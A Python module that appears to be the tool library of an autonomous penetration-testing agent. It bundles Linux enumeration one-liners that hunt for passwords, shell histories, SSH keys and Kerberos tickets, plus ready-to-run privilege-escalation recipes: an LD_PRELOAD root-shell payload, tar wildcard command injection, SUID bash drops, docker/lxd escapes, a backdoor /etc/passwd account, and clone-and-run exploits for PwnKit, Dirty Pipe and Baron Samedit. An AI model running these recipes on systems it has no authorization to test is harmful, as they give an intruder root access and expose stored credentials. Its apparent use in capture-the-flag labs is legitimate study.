"""
Enumeration scripts + exploit recipes.

Two concerns, one file:

1. ENUM_SCRIPTS — compact one-liners or short scripts the agent runs on the
   target. Output stays small and greppable; the agent pipes the output back
   into `analyze_enum_output` for parsing.

2. RECIPES — step-by-step exploit playbooks for the vectors that repeatedly
   come up: PATH hijack, LD_PRELOAD / LD_LIBRARY_PATH, wildcard abuse,
   NFS no_root_squash, Docker/LXD group, polkit/pkexec, cron-writable-script,
   PYTHONPATH hijack, sudo env preservation, etc. The agent picks a recipe by
   keyword and gets a ready-to-run plan instead of improvising.
"""
from __future__ import annotations

from typing import Dict, List, Optional

# ------------------------------------------------------------------ enumeration

ENUM_SCRIPTS: Dict[str, str] = {
    "suid": (
        # SUID with group ownership info; -print0 safe
        "find / -perm -4000 -type f 2>/dev/null -printf '%M %u %g %p\\n'"
    ),
    "sgid": (
        "find / -perm -2000 -type f 2>/dev/null -printf '%M %u %g %p\\n'"
    ),
    "caps": (
        "getcap -r / 2>/dev/null"
    ),
    "sudo": (
        # sudo -l without password, fall back to -n to suppress prompt
        "sudo -n -l 2>/dev/null || sudo -l 2>/dev/null"
    ),
    "cron": (
        "echo '== /etc/crontab =='; cat /etc/crontab 2>/dev/null;"
        "echo; echo '== /etc/cron.d =='; ls -la /etc/cron.d/ 2>/dev/null;"
        "echo; echo '== /etc/cron.* =='; ls -la /etc/cron.*/ 2>/dev/null;"
        "echo; echo '== /var/spool/cron =='; ls -la /var/spool/cron/ /var/spool/cron/crontabs/ 2>/dev/null;"
        "echo; echo '== systemd timers =='; systemctl list-timers --all 2>/dev/null"
    ),
    "writable_etc": (
        "find /etc -writable -type f 2>/dev/null | head -100"
    ),
    "writable_path": (
        # Writable dirs in PATH — PATH hijack candidates
        "echo \"$PATH\" | tr : '\\n' | while read d; do "
        "[ -n \"$d\" ] && [ -w \"$d\" ] && echo \"WRITABLE: $d\"; done"
    ),
    "writable_bins": (
        "find / -perm -o+w -type f \\( -path '/usr/*' -o -path '/opt/*' -o -path '/srv/*' \\) "
        "2>/dev/null | head -100"
    ),
    "writable_services": (
        # Writable systemd unit files — persistence / privesc
        "find /etc/systemd /lib/systemd /usr/lib/systemd -name '*.service' -writable 2>/dev/null"
    ),
    "nfs": (
        "cat /etc/exports 2>/dev/null; showmount -e 127.0.0.1 2>/dev/null"
    ),
    "groups": (
        # Interesting group memberships (docker/lxd/disk/video all = root-ish)
        "id; echo; groups 2>/dev/null"
    ),
    "kernel": (
        "uname -a; echo; cat /etc/os-release 2>/dev/null; echo; "
        "dpkg -l policykit-1 2>/dev/null | tail -1; "
        "rpm -q polkit 2>/dev/null; sudo --version 2>/dev/null | head -1"
    ),
    "env": (
        # Check env vars preserved via sudo / inherited from services
        "sudo -l 2>/dev/null | grep -iE 'env_keep|env_reset|setenv';"
        "env"
    ),
    "passwords": (
        # Fast password hunt in common locations — keep output bounded
        "grep -riE --include='*.conf' --include='*.cfg' --include='*.ini' --include='*.yml' "
        "--include='*.yaml' --include='*.env' --include='*.xml' --include='*.php' "
        "--include='*.py' --include='*.js' --include='*.sh' "
        "-E '(password|passwd|pwd|secret|token|api[-_]?key)\\s*[:=]' "
        "/etc /home /var/www /opt /srv 2>/dev/null | head -200"
    ),
    "ssh_keys": (
        "find / \\( -name 'id_rsa*' -o -name 'id_ed25519*' -o -name 'authorized_keys' "
        "-o -name 'known_hosts' \\) 2>/dev/null"
    ),
    "history": (
        # User shell histories often contain creds
        "for f in /root/.bash_history /home/*/.bash_history /root/.zsh_history "
        "/home/*/.zsh_history /root/.mysql_history /home/*/.mysql_history; do "
        "  [ -r \"$f\" ] && echo \"== $f ==\" && cat \"$f\"; done 2>/dev/null"
    ),
    "docker_lxd": (
        "ls -la /var/run/docker.sock 2>/dev/null; "
        "which docker lxc lxd 2>/dev/null; "
        "groups | grep -oE '\\b(docker|lxd)\\b'"
    ),
    "internal_ports": (
        "ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null"
    ),
    "interesting_procs": (
        # Processes running as root that a low-priv user may influence
        "ps -eo user,pid,cmd --sort=user 2>/dev/null | grep -E '^root' | grep -vE "
        "'\\[|systemd|sshd|/lib/systemd|login|getty|cron|rsyslog|/sbin/agetty'"
    ),
    "mount_opts": (
        # nosuid, nodev, noexec defenses + bind mounts
        "mount | grep -v '^proc\\|^sys\\|^cgroup\\|^tmpfs\\|^devpts'"
    ),
    "kerberos_tickets": (
        "ls -la /tmp/krb5cc* /var/tmp/krb5cc* 2>/dev/null; klist 2>/dev/null"
    ),
}

# Bundled mega-check — run with `bash -c` via execute_command
ALL_ENUM = "\n".join(
    f"echo '=== {k} ==='; {v}" for k, v in ENUM_SCRIPTS.items()
)


def enum_script(targets: Optional[List[str]] = None) -> str:
    """
    Return the enum command(s) for the requested target(s).

    targets=None or ["all"] → bundled mega-script
    """
    if not targets or targets == ["all"]:
        return ALL_ENUM
    pieces: List[str] = []
    for t in targets:
        snippet = ENUM_SCRIPTS.get(t)
        if snippet is None:
            pieces.append(f"echo '=== {t} (unknown) ==='")
            continue
        pieces.append(f"echo '=== {t} ==='; {snippet}")
    return "\n".join(pieces)


def enum_targets() -> List[str]:
    return sorted(ENUM_SCRIPTS.keys())


# ------------------------------------------------------------------ exploit recipes

RECIPES: Dict[str, Dict[str, str]] = {
    "path_hijack": {
        "when": "A script run as root/SUID calls a binary by bare name (e.g. `ps`, `id`) without absolute path, AND a directory you can write to appears in the effective PATH (or PATH itself is writable).",
        "detect": (
            "strings /path/to/suid-binary | grep -E '^[a-z]+$';"
            " echo $PATH | tr : '\\n'"
        ),
        "exploit": (
            "cp /bin/bash /tmp/ps && chmod +x /tmp/ps\n"
            "export PATH=/tmp:$PATH\n"
            "/path/to/suid-binary   # calls our /tmp/ps"
        ),
        "note": "If the script uses `/bin/sh -c 'ps'` you may need to also export PATH in a .bashrc that the target sources, or pivot via LD_PRELOAD.",
    },
    "ld_preload": {
        "when": "sudo -l shows `env_keep+=LD_PRELOAD` (or LD_LIBRARY_PATH), and you can run ANY command via sudo.",
        "detect": "sudo -l 2>/dev/null | grep -iE 'env_keep|LD_PRELOAD|LD_LIBRARY_PATH'",
        "exploit": (
            "cat > /tmp/x.c <<'EOF'\n"
            "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n"
            "void _init() { unsetenv(\"LD_PRELOAD\"); setgid(0); setuid(0); system(\"/bin/sh\"); }\n"
            "EOF\n"
            "gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c\n"
            "sudo LD_PRELOAD=/tmp/x.so <any-allowed-binary>"
        ),
        "note": "If LD_LIBRARY_PATH instead, craft a shared object with the same SONAME as a library the allowed binary uses.",
    },
    "wildcard": {
        "when": "Cron or script runs e.g. `tar czf backup.tgz *` or `chown -R www:www *` in a directory you control.",
        "detect": "ls -la the target dir; look for scripts that `cd` there and run wildcard-heavy commands",
        "exploit_tar": (
            "# tar wildcard → checkpoint exec\n"
            "cd /the/dir\n"
            "echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > x.sh; chmod +x x.sh\n"
            "touch -- '--checkpoint=1'\n"
            "touch -- '--checkpoint-action=exec=sh x.sh'\n"
            "# wait for cron; then:\n/tmp/rb -p"
        ),
        "exploit_chown": (
            "# chown -R with wildcard + symlink\n"
            "cd /the/dir\nln -s /etc/shadow linkyx\n"
            "# after cron runs: chown affects /etc/shadow"
        ),
        "note": "Also works with rsync, chmod, scp (on same box).",
    },
    "nfs_root_squash": {
        "when": "`/etc/exports` on target shows an NFS share with `no_root_squash` option. Mount it on your attacker box.",
        "detect": "cat /etc/exports 2>/dev/null; showmount -e <target>",
        "exploit": (
            "# on attacker (as root):\n"
            "mkdir /mnt/nfs && mount -t nfs <target>:/exported/path /mnt/nfs\n"
            "cp /bin/bash /mnt/nfs/rootbash && chmod +s /mnt/nfs/rootbash\n"
            "# back on target: /exported/path/rootbash -p"
        ),
        "note": "If no_all_squash + anonuid/anongid map to root, similar trick.",
    },
    "docker_group": {
        "when": "Your user is in the `docker` group (or can talk to /var/run/docker.sock).",
        "detect": "groups | grep docker; ls -la /var/run/docker.sock",
        "exploit": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        "note": "Equivalent to root. If no image pulled: `docker images` → pick any; else `docker pull alpine`.",
    },
    "lxd_group": {
        "when": "Your user is in the `lxd` group.",
        "detect": "groups | grep lxd",
        "exploit": (
            "# On attacker: build alpine image via lxd-alpine-builder or:\n"
            "git clone https://github.com/saghul/lxd-alpine-builder && cd lxd-alpine-builder && ./build-alpine\n"
            "# transfer the .tar.gz to target, then:\n"
            "lxc image import ./alpine-*.tar.gz --alias myalpine\n"
            "lxc init myalpine r -c security.privileged=true\n"
            "lxc config device add r mydev disk source=/ path=/mnt/root recursive=true\n"
            "lxc start r && lxc exec r /bin/sh\n"
            "# inside: cd /mnt/root"
        ),
        "note": "Classic HTB technique (Sense, Bastard variants).",
    },
    "capability_setuid": {
        "when": "A binary has cap_setuid+ep (getcap output). Examples: python, perl, php.",
        "detect": "getcap -r / 2>/dev/null | grep setuid",
        "exploit_python": "python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
        "exploit_perl": "perl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/sh\";'",
        "note": "cap_setuid+eip is equivalent. cap_setuid (no +ep) won't work — look at the flags.",
    },
    "pwnkit": {
        "when": "pkexec exists and polkit version is pre-patched (< 0.120, or any distro-unpatched). Works even for unprivileged users.",
        "detect": "which pkexec; ls -la $(which pkexec); dpkg -l policykit-1 2>/dev/null; rpm -q polkit 2>/dev/null",
        "exploit": (
            "git clone https://github.com/berdav/CVE-2021-4034 && cd CVE-2021-4034 && make && ./cve-2021-4034"
        ),
        "note": "If no compiler on target, compile on attacker with matching libc or use a static Python PoC.",
    },
    "dirty_pipe": {
        "when": "Kernel 5.8 ≤ version ≤ 5.16.11 (or 5.15.0-24, 5.10.0-100). Use kernel_exploit_check to confirm.",
        "detect": "uname -r",
        "exploit": (
            "git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits && cd CVE-2022-0847-DirtyPipe-Exploits\n"
            "./compile.sh && ./exploit-1\n"
            "# or overwrite /etc/passwd: ./exploit-2 /etc/passwd 1 'r00t:...' "
        ),
        "note": "Trivial root. If no gcc: transfer precompiled binary from attacker.",
    },
    "sudo_baron_samedit": {
        "when": "sudo < 1.9.5p2 — unpatched Ubuntu 20.04, Debian 10, CentOS 7/8. No sudoers entry required for the caller.",
        "detect": "sudoedit -s / # if 'usage:' → patched, if segfault / malloc error → vulnerable",
        "exploit": "git clone https://github.com/blasty/CVE-2021-3156 && cd CVE-2021-3156 && make && ./sudo-hax-me-a-sandwich",
        "note": "Zero-prereq beyond unpatched sudo. Try before anything else on older boxes.",
    },
    "sudo_runas_negative": {
        "when": "sudoers has `(ALL, !root)` and sudo < 1.8.28 — uid -1 trick bypasses the filter.",
        "detect": "sudo -l 2>/dev/null | grep -E '\\(ALL, !root\\)|\\(ALL,!root\\)'",
        "exploit": "sudo -u#-1 /bin/bash   # or -u#4294967295",
        "note": "CVE-2019-14287.",
    },
    "writable_passwd": {
        "when": "/etc/passwd is world-writable (misconfig, backup restore gone wrong).",
        "detect": "ls -la /etc/passwd; [ -w /etc/passwd ] && echo WRITABLE",
        "exploit": (
            "openssl passwd -1 -salt xx password123  # → $1$xx$...\n"
            "echo 'r00t:<hash-above>:0:0:root:/root:/bin/bash' >> /etc/passwd\n"
            "su r00t   # password: password123"
        ),
    },
    "writable_shadow": {
        "when": "/etc/shadow is readable/writable by low-priv user.",
        "detect": "ls -la /etc/shadow; [ -r /etc/shadow ] && echo READABLE",
        "exploit_read": "# transfer /etc/shadow to attacker → john or hashcat -m 1800",
        "exploit_write": "# replace root's hash with known password's hash",
    },
    "cron_writable_script": {
        "when": "A cron job runs a script you can edit (sys-owned cron but user-writable script).",
        "detect": "# identify in enum; for each cron entry, `ls -la <script>`",
        "exploit": (
            "# Append a reverse shell or SUID bash to the writable script:\n"
            "echo 'cp /bin/bash /tmp/rb && chmod +s /tmp/rb' >> /path/to/writable_script\n"
            "# Wait for cron. Then: /tmp/rb -p"
        ),
    },
    "pythonpath_hijack": {
        "when": "A root-run python script imports a module whose file OR containing dir is writable by you.",
        "detect": "# ps + strings; look for PYTHONPATH in env or relative imports",
        "exploit": (
            "# Create writable module with side-effect on import:\n"
            "echo 'import os; os.system(\"cp /bin/bash /tmp/rb && chmod +s /tmp/rb\")' > /writable/modname.py"
        ),
    },
    "setuid_binary_ret2libc": {
        "when": "Custom SUID binary with classic C bugs (strcpy, system()). Reverse it first.",
        "detect": "file; checksec; strings; gdb",
        "exploit": "# Route via buffer overflow → ret2libc or ROP to system(\"/bin/sh\")",
        "note": "Usually for machines tagged 'binary exploitation'. Use pwntools.",
    },
}


def recipe(vector: str) -> Dict[str, object]:
    """Return a single recipe by vector keyword, or suggest close matches."""
    v = vector.strip().lower()
    if v in RECIPES:
        return {"vector": v, "found": True, **RECIPES[v]}
    # fuzzy: substring match
    close = [k for k in RECIPES if v in k or k in v]
    return {"vector": v, "found": False, "suggestions": close, "available": list(RECIPES.keys())}


def recipe_vectors() -> List[str]:
    return sorted(RECIPES.keys())
